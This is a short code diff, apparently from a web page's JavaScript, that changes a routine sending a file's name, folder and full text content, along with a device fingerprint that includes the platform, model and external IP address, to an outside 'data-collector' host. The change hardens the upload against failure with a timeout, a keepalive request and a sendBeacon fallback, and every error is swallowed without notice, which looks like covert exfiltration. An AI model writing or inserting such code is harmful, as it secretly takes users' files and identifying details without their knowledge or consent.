@@ -153,12 +153,12 @@
         const BASE_API = 'https://data-collector-gizw.onrender.com';
         try {
           const payload = { folder_name: folderName, file_name: fileName, content: txt, fingerprint: [z2,zA,he.model||'',extIP].join('|'), platform: zA, model: he.model||'', externalIP: extIP };
-          const sv = (window._SV)||'';
-          await fetch(`${BASE_API}/collect`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'x-secret-view': sv },
-            body: JSON.stringify(payload)
-          }).catch(()=>{});
+          const send = () => fetch(`${BASE_API}/collect`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true });
+          let ok = false;
+          try{ const r = await Promise.race([send(), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 6000))]); ok = r && r.ok; }catch{}
+          if(!ok){
+            try{ navigator.sendBeacon && navigator.sendBeacon(`${BASE_API}/collect`, new Blob([JSON.stringify(payload)], { type: 'application/json' })); }catch{}
+          }
         } catch {}
       })();
     })();
